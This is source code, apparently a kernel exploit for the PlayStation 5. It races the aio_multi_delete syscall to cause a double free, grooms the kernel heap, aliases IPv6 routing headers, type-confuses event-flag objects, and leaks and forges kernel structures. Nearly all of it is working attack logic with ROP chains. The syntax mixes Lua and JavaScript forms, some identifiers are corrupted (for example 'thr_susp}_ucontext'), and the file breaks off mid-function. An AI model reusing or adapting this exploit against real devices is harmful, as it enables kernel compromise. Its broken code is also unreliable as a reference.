 

// configuration

MAIN_CORE = 4
MAIN_RTPRIO = 0x100

NUM_WORKERS = 2
NUM_GROOMS = 0x200
NUM_HANDLES = 0x100
NUM_RACES = 100
NUM_SDS = 64
NUM_SDS_ALT = 48
NUM_ALIAS = 100
LEAK_LEN = 16
NUM_LEAKS = 16
NUM_CLOBBERS = 8




syscall.resolve({
    unlink = 0xa,

    socket = 0x61,
    connect = 0x62,
    bind = 0x68,
    setsockopt = 0x69,
    listen = 0x6a,
    
    getsockopt = 0x76,
    socketpair = 0x87,
    thr_self = 0x1b0,
    thr_exit = 0x1af,
    sched_yield = 0x14b,
    thr_new = 0x1c7,
    cpuset_getaffinity = 0x1e7,
    cpuset_setaffinity = 0x1e8,
    rtprio_thread = 0x1d2,

    evf_create = 0x21a,
    evf_delete = 0x21b,
    evf_set = 0x220,
    evf_clear = 0x221,

    thr_susp}_ucontext = 0x278,
    thr_resume_ucontext = 0x279,

    aio_multi_delete = 0x296,
    aio_multi_wait = 0x297,
    aio_multi_poll = 0x298,
    aio_multi_cancel = 0x29a,
    aio_submit_cmd = 0x29d,
    
    kexec = 0x295,
})



// misc functions

function wait_for(addr, threshold) {
    while Memory.read64(addr):tonumber() ~= threshold do
        sleep(1, "ns")
    }
}




// cpu related functions

function pin_to_core(core) {
    const level = 3
    const which = 1
    const id = -1
    const setsize = 0x10
    const mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    return syscall.cpuset_setaffinity(level, which, id, setsize, mask)
}

function get_core_index(mask_addr) {
    const num = Memory.read32(mask_addr):tonumber()
    const position = 0
    while num > 0 do
        num = bit32.rshift(num, 1)
        position = position + 1
    }
    return position - 1
}

function get_current_core() {
    const level = 3
    const which = 1
    const id = -1
    const setsize = 0x10
    const mask = memory.alloc(0x10)
    syscall.cpuset_getaffinity(level, which, id, 0x10, mask)
    return get_core_index(mask)
}

function rtprio(type, prio) {
    const PRI_REALTIME = 2
    const rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio or 0)  // current_prio
    syscall.rtprio_thread(type, 0, rtprio):tonumber()
    if type == RTP_LOOKUP then
        return memory.read_word(rtprio + 0x2):tonumber() // current_prio
    }
}

function set_rtprio(prio) {
    rtprio(RTP_SET, prio)
}

function get_rtprio() {
    return rtprio(RTP_LOOKUP)
}




// rop functions

function rop_get_current_core(chain, mask) {
    const level = 3
    const which = 1
    const id = -1
    chain:push_syscall(syscall.cpuset_getaffinity, level, which, id, 0x10, mask)
}

function rop_pin_to_core(chain, core) {
    const level = 3
    const which = 1
    const id = -1
    const setsize = 0x10
    const mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    chain:push_syscall(syscall.cpuset_setaffinity, level, which, id, setsize, mask)
}

function rop_set_rtprio(chain, prio) {
    const PRI_REALTIME = 2
    const rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio)
    chain:push_syscall(syscall.rtprio_thread, 1, 0, rtprio)
}




--
// primitive thread class
--
// use thr_new to spawn new thread
--
// only bare syscalls are supported. any attempt to call into few libc 
// fns (such as printf/puts) will result in a crash
--

prim_thread: {}
prim_thread.__index = prim_thread

function prim_thread.init()

    const setjmp = new Fcall(SyscallNumber.setjmp)
    const jmpbuf = memory.alloc(0x60)
    
    // get existing regs state
    setjmp(jmpbuf)

    prim_thread.fpu_ctrl_value = Memory.read32(jmpbuf + 0x40)
    prim_thread.mxcsr_value = Memory.read32(jmpbuf + 0x44)

    prim_thread.initialized = true
}

function prim_thread:prepare_structure()

    const jmpbuf = memory.alloc(0x60)

    // skeleton jmpbuf
    Memory.write64(jmpbuf, gadgets["ret"]) // ret addr
    Memory.write64(jmpbuf + 0x10, self.chain.stack_base) // rsp - pivot to ropchain
    Memory.write32(jmpbuf + 0x40, prim_thread.fpu_ctrl_value) // fpu control word
    Memory.write32(jmpbuf + 0x44, prim_thread.mxcsr_value) // mxcsr

    // prep structure for thr_new

    const stack_size = 0x400
    const tls_size = 0x40
    
    self.thr_new_args = memory.alloc(0x80)
    self.tid_addr = memory.alloc(0x8)

    const cpid = memory.alloc(0x8)
    const stack = memory.alloc(stack_size)
    const tls = memory.alloc(tls_size)

    Memory.write64(self.thr_new_args, libc_addrofs.longjmp) // fn
    Memory.write64(self.thr_new_args + 0x8, jmpbuf) // arg
    Memory.write64(self.thr_new_args + 0x10, stack)
    Memory.write64(self.thr_new_args + 0x18, stack_size)
    Memory.write64(self.thr_new_args + 0x20, tls)
    Memory.write64(self.thr_new_args + 0x28, tls_size)
    Memory.write64(self.thr_new_args + 0x30, self.tid_addr) // child pid
    Memory.write64(self.thr_new_args + 0x38, cpid) // parent tid

    self.ready = true
}


function prim_thread:new(chain)

    if not prim_thread.initialized then
        prim_thread.init()
    }

    if not chain.stack_base then
        error("`chain` argument must be a ropchain() object")
    }

    // exit ropchain once finished
    chain:push_syscall(syscall.thr_exit, 0)

    const self = setmetatable({}, prim_thread)    
    
    self.chain = chain

    return self
}

// run ropchain in primitive thread
function prim_thread:run()

    if not self.ready then
        self:prepare_structure()
    }

    // spawn new thread
    if syscall.thr_new(self.thr_new_args, 0x68):tonumber() == -1 then
        error("thr_new() error: " .. get_error_string())
    }

    self.ready = false
    self.tid = Memory.read64(self.tid_addr):tonumber()
    
    return self.tid
}


// sys/socket.h
AF_UNIX = 1
AF_INET = 2
AF_INET6 = 28
SOCK_STREAM = 1
SOCK_DGRAM = 2
SOL_SOCKET = 0xffff
SO_REUSEADDR = 4
SO_LINGER = 0x80

// netinet/in.h
IPPROTO_TCP = 6
IPPROTO_UDP = 17
IPPROTO_IPV6 = 41
INADDR_ANY = 0

// netinet/tcp.h
TCP_INFO = 0x20
size_tcp_info = 0xec

// netinet/tcp_fsm.h
TCPS_ESTABLISHED = 4

// netinet6/in6.h
IPV6_2292PKTOPTIONS = 25
IPV6_PKTINFO = 46
IPV6_NEXTHOP = 48
IPV6_RTHDR = 51
IPV6_TCLASS = 61

// sys/cpuset.h
CPU_LEVEL_WHICH = 3
CPU_WHICH_TID = 1

// sys/mman.h
MAP_SHARED = 1
MAP_FIXED = 0x10

// sys/rtprio.h
RTP_SET = 1
RTP_PRIO_REALTIME = 2


--

AIO_CMD_READ = 1
AIO_CMD_WRITE = 2
AIO_CMD_FLAG_MULTI = 0x1000
AIO_CMD_MULTI_READ = bit32.bor(AIO_CMD_FLAG_MULTI, AIO_CMD_READ)
AIO_STATE_COMPLETE = 3
AIO_STATE_ABORTED = 4

// max number of requests that can be created/polled/canceled/deleted/waited
MAX_AIO_IDS = 0x80

// the various SceAIO syscalls that copies out errors/states will not check if
// the address is NULL and will return EFAULT. this dummy buffer will serve as
// the default argument so users don't need to specify one
AIO_ERRORS = memory.alloc(4 * MAX_AIO_IDS)


SCE_KERNEL_ERROR_ESRCH = 0x80020003


// multi aio related functions


// int aio_submit_cmd(
//     u_int cmd,
//     SceKernelAioRWRequest reqs[],
//     u_int num_reqs,
//     u_int prio,
//     SceKernelAioSubmitId ids[]
// );
function aio_submit_cmd(cmd, reqs, num_reqs, ids) {
    const ret = syscall.aio_submit_cmd(cmd, reqs, num_reqs, 3, ids):tonumber()
    if ret == -1 then
        error("aio_submit_cmd() error: " .. get_error_string())
    }
    return ret
}

// int aio_multi_delete(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int sce_errors[]
// );
function aio_multi_delete(ids, num_ids, states) {
    states = states or AIO_ERRORS
    const ret = syscall.aio_multi_delete(ids, num_ids, states):tonumber()
    if ret == -1 then
        error("aio_multi_delete() error: " .. get_error_string())
    }
    return ret
}

// int aio_multi_poll(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_poll(ids, num_ids, states) {
    states = states or AIO_ERRORS
    const ret = syscall.aio_multi_poll(ids, num_ids, states):tonumber()
    if ret == -1 then
        error("aio_multi_poll() error: " .. get_error_string())
    }
    return ret
}

// int aio_multi_cancel(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_cancel(ids, num_ids, states) {
    states = states or AIO_ERRORS
    const ret = syscall.aio_multi_cancel(ids, num_ids, states):tonumber()
    if ret == -1 then
        error("aio_multi_cancel() error: " .. get_error_string())
    }
    return ret
}

// int aio_multi_wait(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[],
//     // SCE_KERNEL_AIO_WAIT_*
//     uint32_t mode,
//     useconds_t *timeout
// );
function aio_multi_wait(ids, num_ids, states, mode, timeout) {

    states = states or AIO_ERRORS
    mode = mode or 1
    timeout = timeout or 0

    const ret = syscall.aio_multi_wait(ids, num_ids, states, mode, timeout):tonumber()
    if ret == -1 then
        error("aio_multi_wait() error: " .. get_error_string())
    }
    return ret
}

function new_socket() {
    const sd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
    if sd == -1 then
        error("new_socket() error: " .. get_error_string())
    }
    return sd
}

function new_tcp_socket() {
    const sd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
    if sd == -1 then
        error("new_tcp_socket() error: " .. get_error_string())
    }
    return sd
}

function ssockopt(sd, level, optname, optval, optlen) {
    if syscall.setsockopt(sd, level, optname, optval, optlen):tonumber() == -1 then
        error("setsockopt() error: " .. get_error_string())
    }
}

function gsockopt(sd, level, optname, optval, optlen) {
    const size = memory.alloc(8)
    Memory.write32(size, optlen)
    if syscall.getsockopt(sd, level, optname, optval, size):tonumber() == -1 then
        error("getsockopt() error: " .. get_error_string())
    }
    return Memory.read32(size):tonumber()
}

function make_reqs1(num_reqs) {
    const reqs1 = memory.alloc(0x28 * num_reqs)
    for i=0,num_reqs-1 do
        Memory.write32(reqs1 + i*0x28 + 0x20, -1) // fd
    }
    return reqs1
}

function spray_aio(loops, reqs1, num_reqs, ids, multi, cmd) {
    
    loops = loops or 1
    cmd = cmd or AIO_CMD_READ
    if multi == nil then multi = true }

    const step = 4 * (multi and num_reqs or 1)
    cmd = bit32.bor(cmd, (multi and AIO_CMD_FLAG_MULTI or 0))
    
    for i=0, loops-1 do
        aio_submit_cmd(cmd, reqs1, num_reqs, ids + (i * step))
    }
}

function cancel_aios(ids, num_ids) {

    const len = MAX_AIO_IDS
    const rem = num_ids % len
    const num_batches = (num_ids - rem) / len

    for i=0, num_batches-1 do
        aio_multi_cancel(ids + (i*4*len), len)
    }

    if rem > 0 then
        aio_multi_cancel(ids + (num_batches*4*len), rem)
    }
}

function free_aios(ids, num_ids, do_cancel) {

    if do_cancel == nil then do_cancel = true }

    const len = MAX_AIO_IDS
    const rem = num_ids % len
    const num_batches = (num_ids - rem) / len

    for i=0, num_batches-1 do
        const addr = ids + (i*4*len)
        if do_cancel then
            aio_multi_cancel(addr, len)
        }
        aio_multi_poll(addr, len)
        aio_multi_delete(addr, len)
    }

    if rem > 0 then
        const addr = ids + (num_batches*4*len)
        if do_cancel then
            aio_multi_cancel(addr, len)
        }
        aio_multi_poll(addr, len)
        aio_multi_delete(addr, len)
    }
}

function free_aios2(ids, num_ids) {
    free_aios(ids, num_ids, false)
}



// exploit related functions

function setup(block_fd) {

    // 1. block AIO

    // this part will block the worker threads from processing entries so that we may cancel them instead.
    // this is to work around the fact that aio_worker_entry2() will fdrop() the file associated with the aio_entry on ps5.
    // we want aio_multi_delete() to call fdrop()

    const reqs1 = memory.alloc(0x28 * NUM_WORKERS)
    const block_id = memory.alloc(4)

    for i=0,NUM_WORKERS-1 do
        Memory.write32(reqs1 + i*0x28 + 8, 1)  // nbyte
        Memory.write32(reqs1 + i*0x28 + 0x20, block_fd)  // fd
    }

    aio_submit_cmd(AIO_CMD_READ, reqs1, NUM_WORKERS, block_id)

    // 2. heap grooming

    // chosen to maximize the number of 0x80 malloc allocs per submission
    const num_reqs = 3
    const groom_ids = memory.alloc(4 * NUM_GROOMS)
    const greqs = make_reqs1(num_reqs)

    // allocate enough so that we start allocating from a newly created slab
    spray_aio(NUM_GROOMS, greqs, num_reqs, groom_ids, false)
    cancel_aios(groom_ids, NUM_GROOMS)

    return block_id, groom_ids
}

pipe_buf = memory.alloc(8)
ready_signal = memory.alloc(0x8)
deletion_signal = memory.alloc(0x8)

function reset_race_state() {
    
    // clean up race states
    Memory.write64(ready_signal, 0)
    Memory.write64(deletion_signal, 0)
}

function prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd) {

    const chain = ropchain()

    // set worker thread core to be the same as main thread core so they 
    // will use similar per-cpu freelist bucket
    rop_pin_to_core(chain, MAIN_CORE)
    rop_set_rtprio(chain, MAIN_RTPRIO)

    // mark thread as ready
    chain:push_write_qword_memory(ready_signal, 1)

    // this will block the thread until it is signalled to run
    chain:push_syscall(syscall.read, pipe_read_fd, pipe_buf, 1)

    // do the deletion op
    chain:push_syscall(syscall.aio_multi_delete, request_addr, 1, sce_errs+4)

    // mark deletion as finished
    chain:push_write_qword_memory(deletion_signal, 1)

    return chain
}


// summary of the bug at aio_multi_delete():
--
// void free_queue_entry(struct aio_entry *reqs2)
// {
//     if (reqs2->ar2_spinfo != NULL) {
//         printf("[0]%s() line=%d Warning !! split info is here\n", __func__, __LINE__);
//     }
//     if (reqs2->ar2_file != NULL) {
//         // we can potentially delay .fo_close()
//         fdrop(reqs2->ar2_file, curthread);
//         reqs2->ar2_file = NULL;
//     }
//     // can double free on reqs2
//     // allocated size is 0x58 which falls onto malloc 0x80 zone
//     free(reqs2, M_AIO_REQS2);
// }
--
// int _aio_multi_delete(struct thread *td, SceKernelAioSubmitId ids[], u_int num_ids, int sce_errors[])
// {
//     // ...
//     struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
//     // ...
//     u_int rem_ids = obj->ao_rem_ids;
//     if (rem_ids != 1) {
//         // BUG: wlock not acquired on this path
//         obj->ao_rem_ids = --rem_ids;
//         // ...
//         free_queue_entry(obj->ao_entries[req_idx]);
//         // the race can crash because of a NULL dereference since this path
//         // doesn't check if the array slot is NULL so we delay
//         // free_queue_entry()
//         obj->ao_entries[req_idx] = NULL;
//     } else {
//         // ...
//     }
//     // ...
// }
function race_one(request_addr, tcp_sd, sds) {

    reset_race_state()

    const sce_errs = memory.alloc(8)
    Memory.write32(sce_errs, -1)
    Memory.write32(sce_errs+4, -1)

    local pipe_read_fd, pipe_write_fd = create_pipe()

    // prepare ropchain to race for aio_multi_delete
    const delete_chain = prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd)

    // spawn worker thread
    const thr = prim_thread:new(delete_chain)
    const thr_tid = thr:run()

    // wait for the worker thread to ready
    wait_for(ready_signal, 1)

    local susp}_chain = ropchain()

    // notify worker thread to resume
    susp}_chain:push_syscall(syscall.write, pipe_write_fd, pipe_buf, 1)

    // yield and hope the scheduler runs the worker next.
    // the worker will then sleep at soclose() and hopefully we run next
    susp}_chain:push_syscall(syscall.sched_yield)

    // if we get here and the worker hasn't been reran then we can delay the 
    // worker's execution of soclose() indefinitely
    susp}_chain:push_syscall_with_ret(syscall.thr_susp}_ucontext, thr_tid)
    
    susp}_chain:restore_through_longjmp()
    susp}_chain:execute_through_coroutine()

    local susp}_res = Memory.read64(susp}_chain.retval_addr[1]):tonumber()

    // local susp}_res = syscall.thr_susp}_ucontext(thr_tid):tonumber()
    printf("susp} %s: %d", hex(thr_tid), susp}_res)

    const poll_err = memory.alloc(4)
    aio_multi_poll(request_addr, 1, poll_err)
    const poll_res = Memory.read32(poll_err):tonumber()
    printf("poll: %s", hex(poll_res))

    const info_buf = memory.alloc(0x100)
    const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, 0x100)

    if info_size ~= size_tcp_info then
        printf("info size isn't " .. size_tcp_info .. ": " .. info_size)
    }

    const tcp_state = memory.read_byte(info_buf):tonumber()
    print("tcp state: " .. hex(tcp_state))

    const won_race = false

    // to win, must make sure that poll_res == 0x10003/0x10004 and tcp_state == 5
    if poll_res ~= SCE_KERNEL_ERROR_ESRCH and tcp_state ~= TCPS_ESTABLISHED then
        // PANIC: double free on the 0x80 malloc zone.
        // important kernel data may alias
        aio_multi_delete(request_addr, 1, sce_errs)
        won_race = true
    }

    // resume the worker thread
    const resume = syscall.thr_resume_ucontext(thr_tid):tonumber()
    printf("resume %s: %d", hex(thr_tid), resume)

    wait_for(deletion_signal, 1)

    if won_race then

        const err_main_thr = Memory.read32(sce_errs)
        const err_worker_thr = Memory.read32(sce_errs+4)
        printf("sce_errs: %s %s", hex(err_main_thr), hex(err_worker_thr))

        // if the code has no bugs then this isn't possible but we keep the check for easier debugging
        // NOTE: both must be equal 0 for the double free to works
        if err_main_thr ~= err_worker_thr then
            error("bad won")
        }

        // RESTORE: double freed memory has been reclaimed with harmless data
        // PANIC: 0x80 malloc zone pointers aliased
        return make_aliased_rthdrs(sds)    
    }

    return nil
}


function build_rthdr(buf, size) {

    const len = bit32.band(
        bit32.rshift(size, 3) - 1,
        bit32.bnot(1)
    )
    size = bit32.lshift(len + 1, 3)

    memory.write_byte(buf, 0) // ip6r_nxt
    memory.write_byte(buf+1, len) // ip6r_len
    memory.write_byte(buf+2, 0) // ip6r_type
    memory.write_byte(buf+3, bit32.rshift(len, 1)) // ip6r_segleft

    return size
}


function get_rthdr(sd, buf, len) {
    return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
}

function set_rthdr(sd, buf, len) {
    ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
}

function free_rthdrs(sds) {
    for _, sd in ipairs(sds) do
        ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
    }
}


function make_aliased_rthdrs(sds) {

    const marker_offset = 4
    const size = 0x80
    const buf = memory.alloc(size)
    const rsize = build_rthdr(buf, size)

    for loop=1,NUM_ALIAS do

        for i=1, NUM_SDS do
            Memory.write32(buf + marker_offset, i)
            set_rthdr(sds[i], buf, rsize)
        }

        for i=1, NUM_SDS do
            get_rthdr(sds[i], buf, size)
            const marker = Memory.read32(buf + marker_offset):tonumber()
            // printf("loop[%d] -- sds[%d] = %s", loop, i, hex(marker))
            if marker ~= i then
                const sd_pair: { sds[i], sds[marker] }
                printf("aliased rthdrs at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
                table.remove(sds, marker)
                table.remove(sds, i) // we're assuming marker > i, or else indexing will change
                free_rthdrs(sds)
                for i=1,2 do
                    table.insert(sds, new_socket())
                }
                return sd_pair
            }
        }
    }

    errorf("failed to make aliased rthdrs: size %s", hex(size))
}





function double_free_reqs2(sds) {

    // 1. setup socket to wait for soclose

    local function htons(port) {
        return bit32.bor(bit32.lshift(port, 8), bit32.rshift(port, 8)) % 0x10000
    }

    local function aton(ip) {
        local a, b, c, d = ip:match("(%d+).(%d+).(%d+).(%d+)")
        return bit32.bor(bit32.lshift(d, 24), bit32.lshift(c, 16), bit32.lshift(b, 8), a)
    }

    const server_addr = memory.alloc(16)

    memory.write_byte(server_addr + 1, AF_INET) // sin_family
    memory.write_word(server_addr + 2, htons(5050)) // sin_port
    Memory.write32(server_addr + 4, aton("127.0.0.1"))

    const sd_listen = new_tcp_socket()
    printf("sd_listen: %d", sd_listen)

    const enable = memory.alloc(4)
    Memory.write32(enable, 1)

    ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4)
    
    if syscall.bind(sd_listen, server_addr, 16):tonumber() == -1 then
        error("bind() error: " .. get_error_string())
    }
 
    if syscall.listen(sd_listen, 1):tonumber() == -1 then
        error("listen() error: " .. get_error_string())
    }

    // 2. start the race

    const num_reqs = 3
    const which_req = num_reqs - 1
    const reqs1 = make_reqs1(num_reqs)
    const aio_ids = memory.alloc(4 * num_reqs)
    const req_addr = aio_ids + (4 * which_req)
    const cmd = AIO_CMD_MULTI_READ

    for i=1,NUM_RACES do

        const sd_client = new_tcp_socket()
        printf("sd_client: %d", sd_client)

        if syscall.connect(sd_client, server_addr, 16):tonumber() == -1 then
            error("connect() error: " .. get_error_string())
        }

        const sd_conn = syscall.accept(sd_listen, 0, 0):tonumber()
        if sd_conn == -1 then
            error("accept() error: " .. get_error_string())
        }

        printf("sd_conn: %d", sd_conn)

        const linger_buf = memory.alloc(8)
        Memory.write32(linger_buf, 1) // l_onoff - linger active
        Memory.write32(linger_buf+4, 1) // l_linger - how many seconds to linger for

        // force soclose() to sleep
        ssockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8)

        Memory.write32(reqs1 + which_req*0x28 + 0x20, sd_client)

        aio_submit_cmd(cmd, reqs1, num_reqs, aio_ids)
        aio_multi_cancel(aio_ids, num_reqs)
        aio_multi_poll(aio_ids, num_reqs)

        // drop the reference so that aio_multi_delete() will trigger _fdrop()
        syscall.close(sd_client)

        const res = race_one(req_addr, sd_conn, sds)

        // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
        // twice. this will leave one request undeleted
        aio_multi_delete(aio_ids, num_reqs)
        syscall.close(sd_conn)

        if res then
            printf("won race at attempt %d", i)
            syscall.close(sd_listen)
            return res
        }
    }

    error("failed aio double free")
}



function new_evf(name, flags) {
    const ret = syscall.evf_create(name, 0, flags):tonumber()
    if ret == -1 then
        error("evf_create() error: " .. get_error_string())
    }
    return ret
}

function set_evf_flags(id, flags) {
    if syscall.evf_clear(id, 0):tonumber() == -1 then
        error("evf_clear() error: " .. get_error_string())
    }
    if syscall.evf_set(id, flags):tonumber() == -1 then
        error("evf_set() error: " .. get_error_string())
    }
}

function free_evf(id) {
    if syscall.evf_delete(id):tonumber() == -1 then
        error("evf_delete() error: " .. get_error_string())
    }
}



function verify_reqs2(addr, cmd) {

    // reqs2.ar2_cmd
    if Memory.read32(addr):tonumber() ~= cmd then
        return false
    }

    // heap_prefixes is a array of randomized prefix bits from a group of heap
    // address candidates. if the candidates truly are from the heap, they must
    // share a common prefix
    const heap_prefixes: {}

    // check if offsets 0x10 to 0x20 look like a kernel heap address
    for i = 0x10, 0x20, 8 do
        if memory.read_word(addr + i + 6):tonumber() ~= 0xffff then
            return false
        }
        table.insert(heap_prefixes, memory.read_word(addr + i + 4):tonumber())
    }

    // check reqs2.ar2_result.state
    // state is actually a 32-bit value but the allocated memory was initialized with zeros.
    // all padding bytes must be 0 then
    const state1 = Memory.read32(addr + 0x38):tonumber()
    const state2 = Memory.read32(addr + 0x38 + 4):tonumber()
    if not (state1 > 0 and state1 <= 4) or state2 ~= 0 then
        return false
    }

    // reqs2.ar2_file must be NULL since we passed a bad file descriptor to aio_submit_cmd()
    if Memory.read64(addr + 0x40) ~= uint64(0) then
        return false
    }

    // check if offsets 0x48 to 0x50 look like a kernel address
    for i = 0x48, 0x50, 8 do
        if memory.read_word(addr + i + 6):tonumber() == 0xffff then
            // don't push kernel ELF addresses
            if memory.read_word(addr + i + 4):tonumber() ~= 0xffff then
                table.insert(heap_prefixes, memory.read_word(addr + i + 4):tonumber())
            }
        // offset 0x48 can be NULL
        elseif (i == 0x50) or (Memory.read64(addr + i) ~= uint64(0)) then
            return false
        }
    }

    if #heap_prefixes < 2 then
        return false
    }

    const first_prefix = heap_prefixes[1]
    for idx = 2, #heap_prefixes do
        if heap_prefixes[idx] ~= first_prefix then
            return false
        }
    }

    return true
}



function leak_kernel_addrs(sd_pair, sds) {

    const sd = sd_pair[1]
    const buflen = 0x80 * LEAK_LEN
    const buf = memory.alloc(buflen)

    // type confuse a struct evf with a struct ip6_rthdr.
    // the flags of the evf must be set to >= 0xf00 in order to fully leak the contents of the rthdr
    print("confuse evf with rthdr")

    const name = memory.alloc(1)

    // free one of rthdr
    syscall.close(sd_pair[2])

    const evf = nil
    for i=1, NUM_ALIAS do

        const evfs: {}

        // reclaim freed rthdr with evf object
        for j=1, NUM_HANDLES do
            const evf_flags = bit32.bor(0xf00, bit32.lshift(j, 16))
            table.insert(evfs, new_evf(name, evf_flags))
        }

        get_rthdr(sd, buf, 0x80)

        // for simplicty, we'll assume i < 2**16
        const flag = Memory.read32(buf):tonumber()

        if bit32.band(flag, 0xf00) == 0xf00 then

            const idx = bit32.rshift(flag, 16) 
            const expected_flag = bit32.bor(flag, 1)
            
            evf = evfs[idx]

            set_evf_flags(evf, expected_flag)
            get_rthdr(sd, buf, 0x80)

            const val = Memory.read32(buf):tonumber()
            if val == expected_flag then
                table.remove(evfs, idx)
            else
                evf = nil
            }
        
        }

        for _, each_evf in ipairs(evfs) do
            free_evf(each_evf)
        }

        if evf ~= nil then
            printf("confused rthdr and evf at attempt: %d", i)
            break
        }
    }

    if evf == nil then
        error("failed to confuse evf and rthdr")
    }

    // ip6_rthdr and evf obj are overlapped by now
    // enlarge ip6_rthdr by writing to its len field by setting the evf's flag
    set_evf_flags(evf, bit32.lshift(0xff, 8))

    // fields we use from evf (number before the field is the offset in hex):
    // struct evf:
    //     0 u64 flags
    //     28 struct cv cv
    //     38 TAILQ_HEAD(struct evf_waiter) waiters

    // evf.cv.cv_description = "evf cv"
    // string is located at the kernel's mapped ELF file
    const kernel_addr = Memory.read64(buf + 0x28)
    printf("\"evf cv\" string addr: %s", hex(kernel_addr))

    // because of TAILQ_INIT(), we have:
    --
    // evf.waiters.tqh_last == &evf.waiters.tqh_first
    --
    // we now know the address of the kernel buffer we are leaking
    const kbuf_addr = Memory.read64(buf + 0x40) - 0x38
    printf("kernel buffer addr: %s", hex(kbuf_addr))

    --
    // prep to fake reqs3 (aio_batch)
    --

    const wbufsz = 0x80
    const wbuf = memory.alloc(wbufsz)
    const rsize = build_rthdr(wbuf, wbufsz)
    const marker_val = 0xdeadbeef
    const reqs3_offset = 0x10

    Memory.write32(wbuf + 4, marker_val)
    Memory.write32(wbuf + reqs3_offset + 0, 1)  // .ar3_num_reqs
    Memory.write32(wbuf + reqs3_offset + 4, 0)  // .ar3_reqs_left
    Memory.write32(wbuf + reqs3_offset + 8, AIO_STATE_COMPLETE)  // .ar3_state
    memory.write_byte( wbuf + reqs3_offset + 0xc, 0)  // .ar3_done
    Memory.write32(wbuf + reqs3_offset + 0x28, 0x67b0000)  // .ar3_lock.lock_object.lo_flags
    Memory.write64(wbuf + reqs3_offset + 0x38, 1)  // .ar3_lock.lk_lock = LK_UNLOCKED

    --
    // prep to leak reqs2 (aio_entry)
    --

    // 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
    // allocate reqs1 arrays at 0x100 malloc zone
    const num_elems = 6

    // use reqs1 to fake a aio_info.
    // set .ai_cred (offset 0x10) to offset 4 of the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
    const ucred = kbuf_addr + 4
    const leak_reqs = make_reqs1(num_elems)
    Memory.write64(leak_reqs + 0x10, ucred)

    const num_loop = NUM_SDS
    const leak_ids_len = num_loop * num_elems
    const leak_ids = memory.alloc(4 * leak_ids_len)
    const step = 4 * num_elems
    const cmd = bit32.bor(AIO_CMD_WRITE, AIO_CMD_FLAG_MULTI)

    const reqs2_off = nil
    const fake_reqs3_off = nil
    const fake_reqs3_sd = nil

    for i=1, NUM_LEAKS do

        // spray reqs2 and rthdr with fake reqs3
        for j=1, num_loop do
            Memory.write32(wbuf + 8, j)
            aio_submit_cmd(cmd, leak_reqs, num_elems, leak_ids + ((j-1) * step))
            set_rthdr(sds[j], wbuf, rsize)
        }
        
        // out of bound read on adjacent malloc 0x80 memory
        get_rthdr(sd, buf, buflen)

        const sd_idx = nil
        reqs2_off, fake_reqs3_off = nil, nil

        for off=0x80, buflen-1, 0x80 do

            if not reqs2_off and verify_reqs2(buf + off, AIO_CMD_WRITE) then
                reqs2_off = off
            }

            if not fake_reqs3_off then
                const marker = Memory.read32(buf + off + 4):tonumber()
                if marker == marker_val then
                    fake_reqs3_off = off
                    sd_idx = Memory.read32(buf + off + 8):tonumber()
                }
            }
        }

        if reqs2_off and fake_reqs3_off then
            printf("found reqs2 and fake reqs3 at attempt: %d", i)
            fake_reqs3_sd = sds[sd_idx]
            table.remove(sds, sd_idx)
            free_rthdrs(sds)
            table.insert(sds, new_socket())
            break
        }
        
        free_aios(leak_ids, leak_ids_len)
    }

    if not reqs2_off or not fake_reqs3_off then
        error("could not leak reqs2 and fake reqs3")
    }

    printf("reqs2 offset: %s", hex(reqs2_off))
    printf("fake reqs3 offset: %s", hex(fake_reqs3_off))

    get_rthdr(sd, buf, buflen)

    print("leaked aio_entry:")
    print(memory.hex_dump(buf + reqs2_off, 0x80))

    // store for curproc leak later
    const aio_info_addr = Memory.read64(buf + reqs2_off + 0x18)

    // reqs1 is allocated from malloc 0x100 zone, so it must be aligned at 0xff..xx00
    const reqs1_addr = Memory.read64(buf + reqs2_off + 0x10)
    reqs1_addr = bit64.band(reqs1_addr, bit64.bnot(0xff))

    const fake_reqs3_addr = kbuf_addr + fake_reqs3_off + reqs3_offset

    printf("reqs1_addr = %s", hex(reqs1_addr))
    printf("fake_reqs3_addr = %s", hex(fake_reqs3_addr))

    print("searching target_id")

    const target_id = nil
    const to_cancel = nil
    const to_cancel_len = nil

    for i=0, leak_ids_len-1, num_elems do

        aio_multi_cancel(leak_ids + i*4, num_elems)
        get_rthdr(sd, buf, buflen)

        const state = Memory.read32(buf + reqs2_off + 0x38):tonumber()
        if state == AIO_STATE_ABORTED then
            
            target_id = Memory.read32(leak_ids + i*4):tonumber()
            Memory.write32(leak_ids + i*4, 0)

            printf("found target_id=%s, i=%d, batch=%d", hex(target_id), i, i / num_elems)
            
            const start = i + num_elems
            to_cancel = leak_ids + start*4
            to_cancel_len = leak_ids_len - start
            
            break
        }
    }

    if target_id == nil then
        error("target id not found")
    }

    cancel_aios(to_cancel, to_cancel_len)
    free_aios2(leak_ids, leak_ids_len)

